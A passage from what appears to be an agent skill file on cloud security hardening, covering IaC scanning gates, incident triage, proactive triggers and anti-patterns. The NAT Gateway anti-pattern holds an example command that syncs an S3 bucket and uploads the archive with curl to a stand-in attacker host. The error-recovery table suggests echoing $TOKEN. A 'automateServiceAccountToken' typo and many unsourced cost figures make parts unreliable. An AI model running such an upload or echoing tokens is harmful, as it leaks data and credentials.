|   |-- Observability: NetworkPolicy audit logging via Cilium Hubble or Calico Enterprise
|-- 3. Authentication & RBAC
|   |-- Disable static token auth, anonymous auth, and insecure port
|   |-- OIDC integration: EKS + AWS IAM Authenticator, AKS + Azure AD, GKE + GCP IAM
|   |-- RBAC: ClusterRoleBindings restricted -- no cluster-admin for CI/CD or developers
|   |-- Namespace-scoped roles: developers get edit in their namespace only
|   |-- Audit logging: API server audit policy logging all request bodies for write operations
|-- 4. Image security pipeline
|   |-- Build: Syft SBOM generation, Grype vulnerability scan, Cosign keyless signing (OIDC + Fulcio)
|   |-- Registry: ECR image scanning on push (basic or Inspector enhanced), deny CRITICAL deployments
|   |-- Admission: Kyverno verify-image rule (checks Cosign signature), block :latest tag
|   |-- Runtime: Periodic re-scan in registry, alert on new CVEs in deployed images
|-- 5. etcd & secret encryption
|   |-- etcd: Always encrypted at rest (KMS envelope encryption) -- enabled at cluster creation
|   |-- Kubernetes secrets: Use KMS plugin (not etcd encryption) -- each secret encrypted with unique DEK
|   |-- Secret rotation: External Secrets Operator syncs from cloud secrets manager with refreshInterval
|   |-- Avoid K8s secrets entirely: CSI Secret Store driver mounts secrets as tmpfs volumes (in-memory only)
```

### IaC Security Pipeline Integration

```

CI/CD security gate integration:
|-- Pre-commit (developer workstation, before commit)
|   |-- pre-commit-terraform: terraform fmt, tflint, terraform validate
|   |-- checkov pre-commit hook: Blocks commit if CRITICAL misconfigurations detected
|   |-- git-secrets / detect-secrets: Blocks commit if secrets found in code
|   |-- Time: <30 seconds, must pass before commit allowed
|-- PR checks (CI pipeline, on pull request)
|   |-- tfsec: Terraform-focused static analysis (comprehensive, 2000+ built-in checks)
|   |-- checkov: Multi-IaC (Terraform, CloudFormation, Kubernetes, Helm, ARM, Bicep, Dockerfile) -- 750+ policies
|   |-- terrascan: OPA-based Rego policies for Terraform (Rego for custom policies)
|   |-- cfn-nag: CloudFormation-specific patterns (security group open to world, unencrypted resources)
|   |-- cfn-guard: AWS policy-as-code for CloudFormation (Guard rules with structured validation)
|   |-- Time: <5 minutes for modest codebases (<50 resources)
|   |-- Gate: Must pass with zero CRITICAL and HIGH findings before merge
|   |-- Findings format: SARIF for GitHub code scanning integration, JUnit XML for CI/CD dashboards
|-- Pre-apply (deployment pipeline, before terraform apply)
|   |-- Terraform Cloud/Enterprise Sentinel: Policy-as-code with tfplan/v2 import, cost estimation before apply
|   |-- OPA: Evaluate Terraform plan JSON against Rego policies, deny if violations
|   |-- Infracost: Show cost impact of changes alongside security findings
|   |-- Time: <2 minutes, must pass before terraform apply proceeds
|-- Post-deployment (drift detection)
|   |-- Drift detection: Compare deployed state against IaC definition (daily)
|   |-- Resource compliance: AWS Config / Azure Policy continuous evaluation
|   |-- Alert on drift: PagerDuty for uncontrolled production changes, auto-remediate (e.g., terraform apply -auto-approve for drifted security groups)

Tool selection by IaC framework:
|-- Terraform: tfsec (fast, comprehensive) + checkov (cross-IaC, custom policies) + terrascan (OPA Rego)
|-- CloudFormation: cfn-lint (syntax) + cfn-nag (security patterns) + cfn-guard (policy-as-code)
|-- Kubernetes manifests: kube-linter + checkov (K8s) + conftest (OPA Rego on structured data)
|-- Pulumi: checkov (Pulumi support) + custom OPA policies on Pulumi state JSON
|-- ARM/Bicep: checkov (ARM/Bicep) + Azure Resource Graph queries for drift detection
```

### Cloud Incident Response Triage

```

Incident detected -- 15-minute containment window:
|-- T+0min: CONTAIN BLAST RADIUS
|   |-- 1. Rotate compromised credentials IMMEDIATELY
|   |   |-- AWS: aws iam update-access-key --access-key-id AKIA... --status Inactive
|   |   |-- Azure: az ad app credential reset / az keyvault secret rotate
|   |   |-- GCP: gcloud iam service-accounts keys disable
|   |-- 2. Isolate compromised resources
|   |   |-- EC2: Apply restrictive security group (DENY ALL ingress/egress), don't terminate (preserve forensics)
|   |   |-- VM: Apply NSG with DENY ALL, disassociate public IP
|   |   |-- GCE: Apply firewall rule DENY ALL, remove external IP
|   |   |-- S3: Apply bucket policy DENY AllActions to Principal *, add legal hold
|   |   |-- Database: Revoke all non-admin access via security group modification
|   |-- 3. Capture volatile evidence
|   |   |-- EC2: Create EBS snapshot, capture memory dump (SSM RunCommand), snapshot auto-scaling group
|   |   |-- GuardDuty: Export finding as evidence PDF
|   |   |-- CloudTrail: Download affected time window, apply legal hold on S3 prefix
|-- T+5min: ENABLE ENHANCED LOGGING
|   |-- Enable VPC Flow Logs (if not already) on all VPCs, publish to S3 + CloudWatch
|   |-- Enable CloudTrail Insights for anomalous API activity detection
|   |-- Enable DNS query logging (Route 53 Resolver Query Logs)
|   |-- Enable S3 server access logs + CloudTrail data events on affected buckets
|   |-- Enable GuardDuty in all regions (if not already) -- 15-minute detection window
|-- T+10min: ASSESS SCOPE
|   |-- IAM Access Analyzer: What can the compromised role access (external + internal)?
|   |-- CloudTrail Lookup: What actions did the compromised identity perform in last 24h?
|   |-- VPC Flow Logs analysis: What IPs communicated with compromised instance?
|   |-- S3 access logs: What objects were accessed or exfiltrated?
|   |-- Cost Explorer: Spike in EC2/Compute spend? (cryptomining indicator)
|-- T+15min: NOTIFY & DOCUMENT
|   |-- Security team: Page on-call via PagerDuty, send GuardDuty/Security Command Center finding
|   |-- Cloud provider: AWS Abuse team (spam, DDoS, cryptomining), Azure Support, GCP Support
|   |-- Legal/compliance: If PII/PHI involved, start breach notification clock (GDPR: 72h, various state laws: 24-72h)
|   |-- Document: Start incident timeline (who, what, when, how, blast radius), preserve all evidence with SHA-256 hashes

Post-incident (after containment):
|-- Root cause analysis: How did attacker gain access? (phishing -> console access, CI/CD secret leak, unpatched CVE, misconfigured S3)
|-- Prevent recurrence: Close the vector (enable MFA, delete long-lived keys, patch CVE, fix bucket policy)
|-- IaC reconciliation: Any manual emergency changes made during incident must be captured in IaC within 24h
|-- Blast radius reduction: If a single compromised role could access 50% of resources, redesign IAM (permission boundaries, SCPs)
|-- Tabletop exercise: Schedule team review of incident response effectiveness, update runbooks
```

## Error Recovery **(STANDARD)**
<!-- STANDARD: 3min -->

If a command or approach fails, follow this escalation path before giving up:

| Symptom | First Action | If That Fails | Last Resort |
|---------|-------------|---------------|-------------|
| Tool/command not found | Check installation: `which [tool]` or `[tool] --version`. Install via package manager (`brew install`, `npm install -g`, `pip install`) | Check PATH: `echo $PATH`. Verify the tool binary is in a PATH directory. Symlink or update PATH if installed but unreachable | Use a functionally equivalent alternative tool. If `rg` is unavailable, use `grep -r`. If `gh` is unavailable, use `git` directly or the GitHub API via `curl` |
| Permission denied | Check ownership: `ls -la [path]`. Fix with `chmod` or `sudo` if appropriate. For API errors (401/403), verify credentials haven't expired: `echo $TOKEN` or check `~/.netrc` | Refresh credentials: re-authenticate with the service. For file permissions, check if the file is locked by another process: `lsof [path]` | Request elevated permissions or use a different authentication method (token vs password, SSH key vs HTTPS) |
| Command hangs or times out | Kill the process: `Ctrl+C`. Re-run with a timeout: `timeout 30 [command]` or `gtimeout` on macOS. Check system resources: `top`, `df -h`, `netstat -an` | Add verbose/debug flags: `--verbose`, `--debug`, `-v`. Check logs: `tail -f [logfile]`. Reduce scope: process fewer files, query a smaller time range, limit concurrency | Split the work into smaller batches. Implement a retry loop with exponential backoff (1s, 2s, 4s, 8s). If the issue is network-related, add `--retry 3` or equivalent |
| Unexpected output or error message | Read the error message completely — the solution is often in the last 3 lines. Search the exact error: `grep -r "[error text]"` in the repo to find prior occurrences | Check GitHub issues for the tool: `gh issue list --repo owner/repo --search "[error keyword]"`. Check Stack Overflow | Simplify the approach. If the complex one-liner fails, break it into 3 sequential commands. If the specialized tool fails, use a more basic tool with more steps |
| Data integrity concern (wrong output, silent failure) | Verify with a manual check: compare output against a known-correct baseline. Add assertions: `[command] | grep -q "[expected]" && echo "OK" || echo "FAIL"` | Run the operation on a smaller subset first. Compare checksums: `shasum`, `md5`. Check for silent truncation: `wc -l` before and after | Abort and flag for human review. Do not proceed past data integrity failures — the cost of propagating bad data exceeds the cost of delay |

**Hard failure boundary:** If 3 different approaches all fail, STOP. Do not iterate infinitely. Log what was tried, capture the error output, and report the blocking issue with full context. Move to the next independent task rather than blocking all progress on one failure.

## Cross-Skill Coordination
<!-- STANDARD: 3min -->

| Scenario | Coordinate With | Why |
|----------|----------------|-----|
| Designing cloud account structure with networking | cloud-architect | Account/OU layout, VPC/VNet topology, Transit Gateway/hub-spoke, CIDR allocation affect security boundaries |
| Application authentication architecture (OAuth, OIDC, SAML) | security-engineer | App-level auth (Cognito, Auth0, Azure AD B2C) must align with cloud IAM role trust and session management |
| CI/CD pipeline with security gates | devops-engineer | IaC scanning integration, OIDC federation instead of long-lived keys, build provenance, deployment approval gates |
| Kubernetes cluster design and operations | cloud-architect, devops-engineer | Node security groups, IRSA/workload identity, NetworkPolicy, admission control, image scanning pipeline |
| Compliance audit preparation and evidence collection | compliance-officer | CIS benchmark evidence packs, CloudTrail/Audit log integrity, Config timeline exports, SOC 2 trust criteria mapping |
| Major security incident (data breach, account takeover) | incident-responder, legal-advisor | CloudTrail forensics, IAM key rotation, legal hold on logs, breach notification timeline, evidence preservation |
| Secrets management strategy across teams | devops-engineer | External Secrets Operator integration, CI/CD OIDC migration plan, developer local development credential workflow |
| Multi-cloud cost optimization with security controls | finops-engineer | CloudTrail/Security Hub cost (data events at $0.10/100K), GuardDuty per-region pricing, NAT Gateway costs vs VPC endpoints |
| Platform engineering and Internal Developer Platform (IDP) | platform-engineer | Golden paths with embedded security (pre-approved IAM roles, security-scanned base images, NetworkPolicy templates) |
| Data protection and encryption strategy | security-engineer | KMS key hierarchy, encryption at rest standards, data classification tagging, DLP for S3/Blob/GCS |

| Upstream Skill | What You Receive | When to Involve |
|---|---|---|
| `system-architect` | System boundaries, data flows, trust model | Before implementing security controls — understand the attack surface |
| `security-reviewer` | STRIDE threat model, OWASP findings, CVSS severity ratings | Before deploying security-critical code |

## Proactive Triggers
<!-- STANDARD: 3min -->

| # | Trigger Condition | Auto-Response | What Happens If Ignored |
|---|------------------|---------------|--------------------------|
| P1 | Security group rule contains `0.0.0.0/0` or `::/0` on any sensitive port (22, 3389, 3306, 5432, 6379, 27017) — `grep -rn "0\.0\.0\.0/0\|::/0" *.tf *.json | grep -E "from_port.*(22|3389|3306|5432|6379|27017|1433)"` | [CRITICAL] Security group open to world on port {PORT}. Replace with specific CIDR ranges immediately. This is the #1 cause of ransomware and cryptomining compromises in cloud environments. | Attackers scan the entire IPv4 space for open database ports. A MongoDB on 0.0.0.0/0 is found and ransomwared within 8 hours of deployment. Average ransom: $2,000 per database. Average cryptomining cost from open SSH: $15K in 48 hours. |
| P2 | IAM user has active access key older than 90 days — `aws iam list-access-keys --user-name X --query 'AccessKeyMetadata[?Status==\`Active\`]'` shows `CreateDate` > 90 days ago | [HIGH] Access key age >90 days detected. Rotate immediately and set up automatic rotation. Long-lived access keys are responsible for 75%+ of cloud credential leaks. | Expired employee's keys in a leaked `.env` file from an old commit → attacker has valid AWS credentials with full production access. Average time from key leak to exploitation: 5 minutes. Average cleanup cost: $30K-$50K. |
| P3 | S3 bucket/Blob container/GCS bucket with public read or write ACL — `aws s3api get-bucket-acl --bucket X | jq '.Grants[] | select(.Grantee.URI)'` OR Block Public Access is `false` with no bucket policy restricting access | [CRITICAL] Public access detected on storage resource. Apply S3 Block Public Access / Azure deny public blob / GCP uniform bucket-level access. Review access logs for unauthorized data access in last 30 days. | The silent failure: Block Public Access = false + no explicit bucket policy = nothing prevents public access. A developer accidentally sets `acl: "public-read"` on a single `terraform apply`. No alert fires. 30 days later, a security researcher finds 50GB of customer PII on a public S3 bucket. Cost: $1M-$4M in fines, notifications, and class action. |
| P4 | Root account / Global Admin without MFA — `aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'` returns `0` | [CRITICAL] Root account without MFA. This is the single highest-value target. Enable hardware MFA, delete root access keys, and set up CloudTrail alert for root activity. | Phished root credentials → attacker creates IAM admin users, enables cryptomining in all regions, deletes CloudTrail logs and S3 backups. Full account takeover. Average total cost: $250K-$500K. Recovery time: days to weeks. |
| P5 | CloudTrail/Audit Logs disabled in any region — `aws cloudtrail describe-trails --region X | jq '.trailList[] | select(.IsMultiRegionTrail==false)'` | [HIGH] Audit logging gap detected in {REGION}. Enable organization-wide CloudTrail with SSE-KMS encryption, log file validation, and multi-region aggregation immediately. | Attacker operates in a region where CloudTrail is disabled — no API calls logged, no GuardDuty findings, no forensic evidence. Breach goes completely undetected. When discovered, zero forensic artifacts exist to determine scope. GDPR violation: failure to detect = aggravated penalty. |
| P6 | EBS volumes/RDS instances/S3 buckets without encryption at rest — `aws ec2 describe-volumes --filters Name=encrypted,Values=false` returns results | [MEDIUM] Unencrypted data stores detected. Enable default encryption (EBS default encryption at account level, S3 default encryption). For existing resources, enable encryption with no downtime (S3 copy-in-place, RDS modify with downtime window, EBS snapshot + encrypted copy). | Insider threat or compromised role copies unencrypted EBS snapshot to external account. Exfiltrated data is in plaintext — no KMS key policy to block cross-account access. All data in the snapshot is immediately readable. Average cost of a data breach involving unencrypted storage: $4.5M (IBM Cost of Data Breach 2024). |

## State Log
<!-- DEEP: 10+min -->
<!-- STANDARD: 3min -->

This skill maintains a **decision ledger** to prevent context drift and ensure recall across sessions. Every major architectural choice, constraint decision, and trade-off must be recorded so that subsequent agents (or future sessions) can recover context without replaying the entire conversation.
## Production Checklist
<!-- STANDARD: 3min -->

- [ ] IAM hardened: zero IAM users with console access and programmatic keys; root account has hardware MFA and zero access keys; all human access uses SSO federation; IAM credential report shows no access keys older than 90 days
- [ ] S3 Block Public Access enabled at the account level; zero buckets with public read/write ACLs; automated Config rule `s3-bucket-public-read-prohibited` with auto-remediation
- [ ] No security group ingress rules with 0.0.0.0/0 or ::/0 on ports 22, 3389, 3306, 5432, 6379, 27017, 1433, 9200, 5601; all sensitive ports scoped to specific CIDR ranges or replaced with Session Manager/Bastion/IAP
- [ ] CloudTrail enabled in all regions with organization trail, log file validation, SSE-KMS encryption, and multi-region aggregation; VPC Flow Logs on all VPCs; DNS query logging enabled
- [ ] All EBS volumes, RDS instances, S3 buckets, EFS file systems, and DynamoDB tables encrypted at rest with KMS-managed keys; EBS default encryption enabled at account level; KMS automatic key rotation enabled
- [ ] All production secrets in a managed secrets store (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) with automatic rotation; zero hardcoded secrets found by truffleHog/git-secrets scan; CI/CD pipelines use OIDC federation — no long-lived IAM credentials
- [ ] CSPM deployed and actively monitoring (Security Hub, Wiz, Prisma Cloud, or Prowler); CRITICAL findings auto-remediated or triaged within 24 hours; CIS benchmark score above 90%
- [ ] Kubernetes security baseline: Pod Security Standards restricted in production, NetworkPolicy default-deny, etcd KMS encryption, admission control blocking privileged pods and `:latest` tags, image signing verified at admission
- [ ] IaC scanning in CI (tfsec/checkov/terrascan) blocking PRs on HIGH/CRITICAL findings; pre-commit hooks for local scanning; no provisioning of unencrypted resources or public S3 buckets
- [ ] Just-in-time access implemented for privileged operations: no standing administrative access, approval workflow with time-bound grants, automatic revocation; break-glass procedure documented and tested
- [ ] Account structure with AWS Organizations and SCPs applied: Security OU for audit tooling, Prod OU with restrictive SCPs, Dev OU with isolated blast radius; SCPs deny leaving organization, disabling CloudTrail, deleting KMS keys, creating IAM users outside identity account
- [ ] WAF deployed on all public-facing endpoints with OWASP Core Rule Set; DDoS protection active (AWS Shield Advanced or equivalent); CloudFront/Cloudflare at the edge for layer 3/4 protection
- [ ] GuardDuty/Security Command Center enabled in all regions; findings forwarded to SIEM and PagerDuty; CRITICAL findings trigger automated incident response playbook
- [ ] Incident response runbooks tested within last quarter for top cloud compromise scenarios: credential leak, public S3 bucket discovery, cryptomining detection, root account compromise, cross-account role abuse

## What Good Looks Like
<!-- STANDARD: 3min -->

```

                                    +---------------------------+
                                    |    AWS Organizations      |
                                    |    with SCPs Applied      |
                                    +---------------------------+
                                              |
                    +-------------------------+-------------------------+
                    |                         |                         |
           +--------v-------+         +-------v------+         +-------v------+
           | Security OU     |         |  Prod OU     |         |  Dev OU      |
           | (audit + logs)  |         |  (workloads) |         |  (sandbox)   |
           +-----------------+         +--------------+         +--------------+
                                              |
                        +---------------------+---------------------+
                        |                     |                     |
               +--------v------+    +--------v------+    +--------v------+
               |   App VPC     |    |   Data VPC    |    | Shared Svcs   |
               | 10.1.0.0/16   |    | 10.2.0.0/16   |    | 10.0.0.0/16   |
               +---------------+    +---------------+    +---------------+
                        |
            +-----------+-----------+-----------+
            |           |           |           |
     +------v----+ +---v----+ +---v----+ +----v------+
     |Pub Subnet | |App Sub | |Data Sub| | Endpoints  |
     |(ALB only) | |Private | |Private | | S3, KMS,   |
     |WAF+DDoS   | |no pubIP| |no net  | | SSM, ECR,  |
     +-----------+ +--------+ +--------+ | STS, CWLogs|
                                          +------------+

Layer 1 (Perimeter):  AWS Shield + WAF on ALB/CloudFront
Layer 2 (Network):    Security groups (never 0.0.0.0/0), NACLs (stateless backup),
                      VPC endpoints (no internet for service traffic),
                      VPC Flow Logs -> CloudWatch -> GuardDuty
Layer 3 (IAM):        SSO-federated, MFA-enforced, permission boundaries on all roles,
                      IAM Access Analyzer continuous monitoring, no static access keys
Layer 4 (Data):       SSE-KMS encryption at rest (CMKs with rotation), TLS 1.2+ in transit,
                      S3 Block Public Access (account-level), Macie for PII detection
Layer 5 (Compute):    IMDSv2 required, no instance profiles with wildcards,
                      Inspector vulnerability scanning, Systems Manager (no SSH),
                      GuardDuty EC2 finding types (cryptomining, backdoor, Trojan)
Layer 6 (Containers): Pod Security Standards (restricted), NetworkPolicy default-deny,
                      image signing (Cosign), etcd KMS encryption, admission control (Kyverno)
Layer 7 (Observability): CloudTrail (all regions, validated, SSE-KMS), Config (all resource types),
                      Security Hub (aggregated findings), GuardDuty (all regions),
                      CloudWatch alarms -> PagerDuty for CRITICAL findings

```

## Deliberate Practice
<!-- STANDARD: 3min -->

```

Cloud Practitioner                     Cloud Security Architect
       |                                         ^
       v                                         |
+------------------+                    +-----------------------+
| Learn: Single    |                    | Mastery: Design       |
| account, console |                    | org-wide security     |
| click-ops, basic |                    | architecture for      |
| IAM policies,    |                    | 100+ accounts, multi- |
| default VPC, no  |                    | cloud, zero standing  |
| encryption       |                    | credentials, fully    |
+------------------+                    | automated compliance  |
       |                                +-----------------------+
       |  6 months:                                |
       v                                           |
+------------------+                    +-----------------------+
| Level 1: IaC     |                    | Level 4: Multi-cloud  |
| fundamentals,    |   18 months:      | governance, federated |
| Terraform basics |----------------->>| SIEM, automated IR    |
| S3 policies, KMS |                    | runbooks, chaos       |
+------------------+                    | engineering security  |
       |                                +-----------------------+
       |  12 months:                               |
       v                                           |
+------------------+                    +-----------------------+
| Level 2: IAM     |                    | Level 3: Org security |
| mastery, SCPs,   |   24 months:      | CNAPP deployment,     |
| permission       |----------------->>| compliance-as-code,   |
| boundaries,      |                    | container security,   |
| dynamic secrets  |                    | incident response     |
+------------------+                    +-----------------------+

```

## Anti-Hallucination
<!-- STANDARD: 3min -->

| Rationalization | Reality |
|---|---|
| "We're not a target — we're a startup/SMB, attackers go after enterprises." | Automated scanners don't discriminate by company size. Every public IP, every S3 bucket, every exposed API is scanned continuously. $50K-$500K in crypto mining, ransomware, and data theft from opportunistic attacks that hit organizations of all sizes. |
| "Security controls will slow down our engineering velocity — we'll add them later." | One breach costs 10-50x what a year of proactive security investment would have cost. GDPR fines alone reach 4% of annual revenue. $1M-$5M per breach vs. $100K-$200K/year in security engineering. The math is devastating. |
| "This infrastructure is internal-only — no external exposure, so it's fine." | Lateral movement from a single compromised developer laptop reaches "internal" systems in minutes. VPN, bastion host, or compromised CI pipeline all provide the bridge. $100K-$500K in internal-system compromise that started with "it's internal, it's fine." |
| "We'll enable CloudTrail, Security Hub, and GuardDuty next sprint — they're just logging tools." | 6 months without audit logging = zero forensic capability after a breach. Can't determine what was accessed, when, or by whom. Breach notification becomes a worst-case-scenario disclosure. $200K-$1M in regulatory fines and legal exposure from inability to scope the breach. |
| "Default AWS settings are secure — AWS wouldn't ship insecure defaults." | Pre-2023 accounts had S3 Block Public Access disabled by default. Default security groups allow all outbound traffic. Default VPCs create public subnets with automatic public IP assignment. $1M-$5M from a single public S3 bucket exposure containing customer data — the most common and most devastating cloud misconfiguration. |

## Anti-Patterns
<!-- STANDARD: 3min -->

### IAM Gotchas

*   **S3 Block Public Access = false with no bucket policy — the silent public exposure.** AWS accounts created before Block Public Access was the default (pre-2023) may have it disabled at the account level. When Block Public Access is false AND a bucket has no explicit bucket policy denying public access, ANY `PutBucketAcl` or `PutObjectAcl` call with `public-read` works silently. A developer adding `acl: "public-read"` to a single Terraform resource creates a public S3 bucket — and no CloudTrail alarm fires because `PutBucketAcl` is a normal API call. Security Hub may take up to 24 hours to detect the change. A bucket named `company-backups` with 2TB of database exports is now accessible at `https://company-backups.s3.amazonaws.com/`. Attackers use tools like GrayhatWarfare to scan for these. **Total cost: $1M-$5M — the public S3 bucket is discovered by a security researcher 3 weeks later, triggering mandatory breach notification for 500,000+ customer records, GDPR maximum fine (4% of annual revenue), class-action lawsuit, and permanent reputation damage.** Fix: Enable Block Public Access at the account level — it overrides all bucket-level ACLs. Add an SCP: `Deny s3:PutBucketAcl` with `public-read` and `public-read-write`. Add an automated Config rule: `s3-bucket-public-read-prohibited` and `s3-bucket-public-write-prohibited` with auto-remediation. The silent nature of this misconfiguration — no error, no alert, no anomaly — makes it the most dangerous cloud configuration mistake.

*   **IAM users with console access and access keys are double-dangerous.** A single compromised IAM user with console access AND an API access key gives attackers both interactive console access and programmatic API access. If they also have `iam:CreateAccessKey` and `iam:CreateLoginProfile`, they can create additional persistent backdoors. Never give human users programmatic access keys -- use SSO for console, temporary credentials for CLI. A compromised admin IAM user can create a cryptomining operation costing $10K-$50K in 24 hours. **Total cost: $10K-$100K in compute charges + data exfiltration damages from a single compromised IAM user.**

*   **The `NotAction` effect in IAM policies is a footgun.** A policy with `"Effect": "Allow", "NotAction": "iam:*"` allows EVERYTHING except IAM actions -- this is effectively admin access minus IAM. Attackers can spin up EC2 instances in every region, exfiltrate all S3 data, delete CloudTrail logs, and create new resources. Never use `NotAction` with `Allow` -- use `Action` with explicit resource ARNs instead. A misconfigured `NotAction: Allow` policy on a CI/CD role resulted in a $120K cryptomining bill over a weekend when the CI/CD token was leaked. **Total cost: $50K-$150K in compute fraud + data loss from a single `NotAction` policy mistake.**

*   **Trust policies without ExternalId are confused deputy attacks waiting to happen.** A cross-account role with `"Principal": { "AWS": "111122223333" }` but no `ExternalId` condition allows any user in account 111122223333 to assume it -- including a compromised third-party vendor's account. The confused deputy attack: attacker compromises VendorCo's account, finds your trust policy, assumes your admin role, and owns your account. Always require `sts:ExternalId` with a cryptographically random value. **Total cost: $100K-$500K+ in full account takeover and data breach from missing ExternalId condition.**

### Network Gotchas

*   **NAT Gateways are $32.85/month each ($0.045/hr) but are NOT a security boundary.** Many teams treat NAT Gateways as a security control (resources are "private" because they go through NAT). This is false: any instance with a default route through a NAT Gateway can exfiltrate data to the internet -- 10TB of S3 data exfiltrated via `aws s3 sync s3://prod-data ./ && curl -T prod-data.tar.gz https://evil.exfil.com` costs the attacker nothing and you $920 in data transfer fees. Use VPC endpoints for AWS services (free), and a forward proxy with allowlisting for internet egress. **Total cost: $1K-$10K in data transfer + breach costs from treating NAT Gateway as a security perimeter.**

*   **Security groups are stateful, NACLs are stateless -- this causes mayhem when mixed incorrectly.** A security group allows inbound SSH on port 22 from 10.0.0.0/8. A NACL allows inbound port 22 but denies outbound ephemeral ports (1024-65535). Result: SSH connection succeeds (SG allows inbound), but no response packets return (NACL denies outbound). This "works intermittently" bug is a classic cloud support ticket sink. Always ensure NACLs allow the full ephemeral range (1024-65535) outbound when using stateful security groups. **Total cost: 4-8 hours of debugging per team per year, delayed deployments.**

### Secrets Gotchas

*   **Environment variables are NOT secret stores.** `process.env.DATABASE_PASSWORD` is readable by every library in your dependency tree, every child process, every crash report, every monitoring agent, and every debugging tool. A compromised npm package that reads `process.env` can exfiltrate your entire environment in milliseconds. Use Secrets Manager SDK calls at startup with caching in memory only, or use the CSI Secret Store driver (mounts secrets as tmpfs volumes -- never on disk). **Total cost: $50K-$500K in data breach from environment variable secrets leaked via supply chain attack.**

*   **Hardcoded AWS keys in GitHub public repos are exploited within 5 minutes.** Attackers run automated scanners that trigger on AWS key regex patterns (`AKIA[0-9A-Z]{16}`). The window between committing a key and it being exploited is typically under 5 minutes. GitHub's secret scanning partnership with AWS will automatically notify and quarantine the key, but by then it may already be exploited. Use `git-secrets` pre-commit hooks and GitHub push protection. A startup hardcoded an AWS root key in a public repo -- within 4 minutes, attackers spun up $40K of EC2 instances across 8 regions for Bitcoin mining. **Total cost: $5K-$40K+ in minutes from a single `git push` with hardcoded credentials.**

### Kubernetes Gotchas

*   **The `default` service account in every namespace has no RBAC restrictions by default.** Unless you explicitly bind it to a role, the default service account has no permissions -- but if ANY ClusterRoleBinding references the `system:serviceaccounts:default` group, every pod in the default namespace inherits those permissions. An attacker who compromises a single pod in the default namespace can enumerate all RBAC and potentially escalate to cluster-admin. Set `automountServiceAccountToken: false` on all pods that do not need API access, and never bind roles to the `default` service account. **Total cost: Cluster compromise from a single vulnerable web app in the default namespace -- $50K-$200K in breach costs.**

### IaC Gotchas

*   **`terraform destroy` has no confirmation for security controls.** Running `terraform destroy` in a module that manages IAM roles, security groups, and KMS keys removes ALL security controls simultaneously -- leaving a wide-open, unprotected environment. KMS key deletion (even with 7-30 day waiting period) makes all encrypted data permanently unrecoverable. Protect critical security infrastructure with: (1) `prevent_destroy` lifecycle on KMS keys and security groups, (2) SCP denying `kms:ScheduleKeyDeletion` and `ec2:DeleteSecurityGroup` outside the security account, (3) MFA requirement for `terraform destroy`. **Total cost: $100K-$1M+ in data loss from accidental KMS key deletion (unrecoverable) + exposure from removed security groups.**

### Compliance Gotchas

*   **CloudTrail data events are NOT enabled by default and cost extra.** Management events (create, update, delete) are free and enabled by default. Data events (S3 object-level, Lambda invocations, DynamoDB item-level) cost $0.10 per 100,000 events and must be explicitly enabled. In a PCI DSS environment, missing S3 data events means you cannot prove which objects were accessed during a breach -- failing PCI Requirement 10 (audit logging). Enable data events on S3 buckets containing cardholder data and security logs. A production S3 bucket with 10M monthly GET/PUT operations costs $10/month for data event logging -- a fraction of a PCI non-compliance fine. **Total cost: $100-$500/month for CloudTrail data events vs $5K-$100K PCI non-compliance fine.**

## Gotchas
<!-- DEEP: 10+min -->
<!-- STANDARD: 3min -->

| Gotcha | Cost | Fix |
|--------|------|-----|
| Assuming cloud provider defaults are secure — S3 Block Public Access was opt-in for accounts created before 2023, default VPCs create public subnets with auto-assigned public IPs, and default security groups allow all outbound traffic. | $1M-$5M from a single public S3 bucket exposure containing customer data | Run a cloud security baseline assessment (CIS, AWS Foundational Security Best Practices) on every account. Enable account-level S3 Block Public Access. Review default VPC configurations and replace with hardened VPC designs. |
| Managing IAM with individual user policies instead of groups and roles — when an engineer changes teams, their permissions accumulate across roles. After 2 years, everyone is effectively an admin because no one can safely remove any permission without breaking something. | $200K-$500K in privilege escalation risk and compliance audit failures | Use IAM groups for human users and IAM roles for services. Assign permissions to groups/roles, never to individual users. Implement permission boundaries and SCPs at the organization level. Audit IAM with Access Analyzer and IAM Credential Report monthly. |
| Running Kubernetes clusters with the default service account token mounted in every pod — a compromised web app pod can now authenticate to the Kubernetes API, enumerate cluster resources, and escalate to cluster-admin if RBAC is misconfigured. | $500K-$2M in cluster compromise from a single vulnerable application pod | Set `automateServiceAccountToken: false` on all pods that don't need Kubernetes API access. Use IRSA (IAM Roles for Service Accounts) or Workload Identity for cloud resource access. Never bind cluster roles to the default service account. |

## Verification
<!-- STANDARD: 3min -->

After completing a cloud security assessment or design, run this sequence. Do not proceed past a failure.

1.  **IAM credential check:** Zero IAM users with active access keys older than 90 days. Root account has MFA (hardware token preferred) and zero access keys. All human access is through SSO federation. If not, rotate keys and migrate to SSO immediately.
2.  **Public exposure check:** Zero S3 buckets/Blob containers/GCS buckets with public read or write ACLs. Account-level Block Public Access enabled. If not, apply immediately and audit access logs for previous exposure.
3.  **Security group audit:** No security group ingress rule with `0.0.0.0/0` or `::/0` on ports 22, 3389, 3306, 5432, 6379, 27017, 1433, 1521, 9200, 5601. If found, scope to specific CIDR ranges or replace with Session Manager/Bastion/IAP.
4.  **Encryption audit:** All EBS volumes, RDS instances, S3 buckets, and EFS file systems encrypted at rest. Account-level default encryption enabled for EBS and S3. If not, enable and remediate existing resources.
5.  **Logging audit:** CloudTrail enabled in all regions with log file validation, SSE-KMS encryption, and multi-region aggregation. VPC Flow Logs enabled on all VPCs. If missing, enable immediately -- logging gaps are compliance failures and blind spots during incidents.
6.  **Secrets audit:** Zero hardcoded secrets found by truffleHog/git-secrets scan. All production secrets in managed secrets store with automatic rotation enabled. CI/CD pipelines use OIDC federation, not long-lived credentials.
7.  **Kubernetes audit (if applicable):** Pod Security Standards enforced (restricted for production). NetworkPolicy default-deny applied. etcd encryption enabled. Admission control blocking privileged pods and latest tags. Image signing enforced via Kyverno/Gatekeeper.

If any check fails: diagnose from checklist, provide specific actionable fix with Terraform/policy code, restart verification from failed item.

## Verification Guardrails
<!-- STANDARD: 3min -->

Before delivering work, verify: self-check against What Good Looks Like, no broken references, continuity with State Log, no fabricated APIs/versions/capabilities, Error Recovery paths exercised, cross-skill dependencies satisfied. If any fail, revise before delivering.

## References
<!-- STANDARD: 3min -->

*   [AWS Security Reference Architecture (SRA)](https://docs.aws.amazon.com/prescriptive-guidance/latest/security-reference-architecture/) -- AWS official multi-account security architecture with SCPs, IAM, and account structure
*   [AWS Well-Architected Framework: Security Pillar](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/) -- Design principles, best practices, and remediation
